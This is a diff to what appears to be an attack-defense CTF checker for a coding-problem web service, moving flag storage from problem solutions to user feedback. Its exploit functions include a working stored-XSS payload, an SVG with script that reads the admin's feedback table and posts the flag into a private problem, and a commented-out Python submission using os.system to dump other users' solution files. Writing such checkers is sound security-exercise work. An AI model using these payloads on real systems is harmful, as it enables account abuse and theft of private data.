@@ -135,8 +135,61 @@ CHECKER FUNCTIONS
         
 #     return username
 
+# @checker.putflag(0)
+# async def putflag_solutions(
+#     task: PutflagCheckerTaskMessage,
+#     db: ChainDB,
+#     client: AsyncClient,
+#     logger: LoggerAdapter,    
+# ) -> None:
+#     conn = Connection(logger, client)
+#     username: str = "checker_" + "".join(
+#         random.choices(string.ascii_uppercase + string.digits, k=12)
+#     )
+#     password: str = "checker_" + "".join(
+#         random.choices(string.ascii_uppercase + string.digits, k=12)
+#     )
+
+#     await conn.register_user(username, password)
+
+#     await conn.login_user(username, password)
+
+#     problem_title = generate_title()
+#     problem_description = generate_title()
+
+#     headers = {"Accept": "application/json"}
+#     response = await conn.client.post(
+#             "/problems/create",
+#             headers=headers,
+#             data={
+#                 "title": problem_title,
+#                 "description": problem_description,
+#                 "difficulty": random.choice(["easy", "medium", "hard"]),
+#                 "testCases": json.dumps(["sample input"]),
+#                 "expectedOutputs": json.dumps(["sample output"]),
+#                 "isPublished": "true",
+#                 "isPrivate": "false",
+#                 "maxRuntime": "1.0"
+#             }
+#         )
+
+#     data = response.json()
+#     problem_id = data.get("problem_id")
+#     if not problem_id:
+#         raise MumbleException("No problem ID in response")
+    
+#     response = await conn.client.post(
+#         f"/problems/details/{problem_id}/submit",
+#         data={"code": f"""print("{task.flag}")"""}
+#     )
+    
+#     if response.status_code != 200:
+#         raise MumbleException(f"Failed to submit solution: {response.status_code}")
+    
+#     await db.set("userdata", (username, password, problem_id))
+
 @checker.putflag(0)
-async def putflag_solutions(
+async def putflag_feedback(
     task: PutflagCheckerTaskMessage,
     db: ChainDB,
     client: AsyncClient,
@@ -151,45 +204,20 @@ async def putflag_solutions(
     )
 
     await conn.register_user(username, password)
-
     await conn.login_user(username, password)
 
-    problem_title = generate_title()
-    problem_description = generate_title()
-
-    headers = {"Accept": "application/json"}
     response = await conn.client.post(
-            "/problems/create",
-            headers=headers,
-            data={
-                "title": problem_title,
-                "description": problem_description,
-                "difficulty": random.choice(["easy", "medium", "hard"]),
-                "testCases": json.dumps(["sample input"]),
-                "expectedOutputs": json.dumps(["sample output"]),
-                "isPublished": "true",
-                "isPrivate": "false",
-                "maxRuntime": "1.0"
-            }
-        )
-
-    data = response.json()
-    problem_id = data.get("problem_id")
-    if not problem_id:
-        raise MumbleException("No problem ID in response")
-    
-    response = await conn.client.post(
-        f"/problems/details/{problem_id}/submit",
-        data={"code": f"""print("{task.flag}")"""}
+        "/feedback/submit",
+        data={
+            "description": task.flag,
+            "image": None
+        }
     )
-    
-    if response.status_code != 200:
-        raise MumbleException(f"Failed to submit solution: {response.status_code}")
-    
-    await db.set("userdata", (username, password, problem_id))
-    
-    
 
+    if response.status_code not in [200, 201, 302]:
+        raise MumbleException(f"Failed to submit feedback: {response.status_code}")
+    
+    await db.set("userdata", (username, password))
 
 # @checker.getflag(0)
 # async def getflag_drafts(
@@ -215,12 +243,35 @@ async def putflag_solutions(
 #     if task.flag not in content:
 #         raise MumbleException("Flag was not found in the problem content")
     
+# @checker.getflag(0)
+# async def getflag_solutions(
+#     task: GetflagCheckerTaskMessage, db: ChainDB, client: AsyncClient, logger: LoggerAdapter
+# ) -> None:
+#     try:
+#         username, password, problem_id = await db.get("userdata")
+#     except KeyError:
+#         raise MumbleException("Missing database entry from putflag")
+    
+#     conn = Connection(logger, client)
+
+#     await conn.login_user(username, password)
+
+#     response = await conn.client.get(f"/problems/details/{problem_id}")
+
+#     if response.status_code != 200:
+#         raise MumbleException(f"Failed to retrieve problem. Status code: {response.status_code}")
+    
+#     content = response.text
+
+#     if task.flag not in content:
+#         raise MumbleException("Flag was not found in the problem content")
+    
 @checker.getflag(0)
-async def getflag_solutions(
+async def getflag_feedback(
     task: GetflagCheckerTaskMessage, db: ChainDB, client: AsyncClient, logger: LoggerAdapter
 ) -> None:
     try:
-        username, password, problem_id = await db.get("userdata")
+        username, password = await db.get("userdata")
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
     
@@ -228,20 +279,19 @@ async def getflag_solutions(
 
     await conn.login_user(username, password)
 
-    response = await conn.client.get(f"/problems/details/{problem_id}")
-
-    if response.status_code != 200:
-        raise MumbleException(f"Failed to retrieve problem. Status code: {response.status_code}")
+    response = await conn.client.get("/feedback")
+    
+    if response.status_code not in [200, 201, 302]:
+        raise MumbleException(f"Failed to retrieve feedback: {response.status_code}")
     
     content = response.text
 
     if task.flag not in content:
-        raise MumbleException("Flag was not found in the problem content")
-    
+        raise MumbleException("Flag was not found in the feedback content")
     
 
 # @checker.exploit(0)
-# async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
+# async def exploit_drafts(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
 #     username: str = "checker_" + "".join(
 #         random.choices(string.ascii_uppercase + string.digits, k=12)
 #     )
@@ -274,8 +324,44 @@ async def getflag_solutions(
     
 #     raise MumbleException("No flag found in any problem description")
 
+# @checker.exploit(0)
+# async def exploit_solutions(task: ExploitCheckerTaskMessage, 
+#                    searcher: FlagSearcher, 
+#                    client: AsyncClient, 
+#                    logger: LoggerAdapter
+# ) -> Optional[str]:
+#     username: str = "checker_" + "".join(
+#         random.choices(string.ascii_uppercase + string.digits, k=12)
+#     )
+#     password: str = "checker_" + "".join(
+#         random.choices(string.ascii_uppercase + string.digits, k=12)
+#     )
+
+#     conn = Connection(logger, client)
+#     await conn.register_user(username, password)
+#     await conn.login_user(username, password)
+    
+#     exploit_script = """import os
+# os.system('find submissions -type f -name "solution.py" | while read -r file; do echo "===== $file ====="; cat "$file"; echo; done')
+# """
+
+#     response = await conn.client.post(
+#         "/problems/details/1/submit",
+#         data={"code": exploit_script}
+#     )
+
+#     if response.status_code != 200:
+#         raise MumbleException(f"Failed to submit exploit: {response.status_code}")
+    
+#     data = response.text
+
+#     if task.flag not in data:
+#         raise MumbleException("Flag was not found in the exploit output")
+    
+#     return task.flag
+
 @checker.exploit(0)
-async def exploit1(task: ExploitCheckerTaskMessage, 
+async def exploit_feedback(task: ExploitCheckerTaskMessage, 
                    searcher: FlagSearcher, 
                    client: AsyncClient, 
                    logger: LoggerAdapter
@@ -286,29 +372,97 @@ async def exploit1(task: ExploitCheckerTaskMessage,
     password: str = "checker_" + "".join(
         random.choices(string.ascii_uppercase + string.digits, k=12)
     )
-
+    
     conn = Connection(logger, client)
     await conn.register_user(username, password)
     await conn.login_user(username, password)
     
-    exploit_script = """import os
-os.system('find submissions -type f -name "solution.py" | while read -r file; do echo "===== $file ====="; cat "$file"; echo; done')
-"""
+    # Create an SVG with malicious JavaScript that steals flags from the feedback page
+    malicious_js = """
+    (async () => {
+        try {
+            const thirdCell = document.querySelector('tbody tr td:nth-child(3)');
+            const flag = thirdCell
+            ? thirdCell.textContent.trim()
+            : 'FLAG_NOT_FOUND';
 
-    response = await conn.client.post(
-        "/problems/details/1/submit",
-        data={"code": exploit_script}
-    )
+            const params = new URLSearchParams({
+            title:           flag,
+            description:     `Captured via admin feedback: ${flag}`,
+            difficulty:      'Easy',
+            testCases:       JSON.stringify(['dummy input']),
+            expectedOutputs: JSON.stringify(['dummy output']),
+            maxRuntime:      '1.0',
+            isPublished:     'false',
+            isPrivate:       'true',
+            accessUsers:     'user333'
+            });
 
+            await fetch('/problems/create', {
+                method:      'POST',
+                credentials: 'include',
+                headers:     { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body:        params.toString()
+            });
+        } catch (e) {
+        }
+    })();
+    """
+    
+    svg_payload = f"""<?xml version="1.0" standalone="no"?>
+    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+    <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+        <script type="text/javascript">
+        {malicious_js}
+        </script>
+        <rect width="100" height="100" fill="blue" />
+    </svg>
+    """
+    
+    import tempfile
+    import os
+    
+    temp_dir = tempfile.mkdtemp()
+    svg_path = os.path.join(temp_dir, "exploit.svg")
+    
+    with open(svg_path, "w") as f:
+        f.write(svg_payload)
+    
+    # Submit feedback with the malicious SVG
+    with open(svg_path, 'rb') as svg_file:
+        files = {'image': ('exploit.svg', svg_file, 'image/svg+xml')}
+        data = {'description': 'Testing feedback feature'}
+        
+        response = await conn.client.post(
+            "/feedback/submit",
+            data=data,
+            files=files
+        )
+    
+    os.unlink(svg_path)
+    os.rmdir(temp_dir)
+    
+    if response.status_code not in [200, 201, 302]:
+        raise MumbleException(f"Failed to submit feedback: {response.status_code}")
+    
+    await asyncio.sleep(65)  # Give some time for the exploit to work
+    
+    response = await conn.client.get('/private-problems')
+    
     if response.status_code != 200:
-        raise MumbleException(f"Failed to submit exploit: {response.status_code}")
+        raise MumbleException(f"Failed to get private problems: {response.status_code}")
     
-    data = response.text
-
-    if task.flag not in data:
-        raise MumbleException("Flag was not found in the exploit output")
+    if flag := searcher.search_flag(response.text):
+        return flag
     
-    return task.flag
+    await asyncio.sleep(5)
+    response = await conn.client.get('/private-problems')
+    
+    if response.status_code == 200:
+        if flag := searcher.search_flag(response.text):
+            return flag
+            
+    return None
 
 if __name__ == "__main__":
     checker.run()
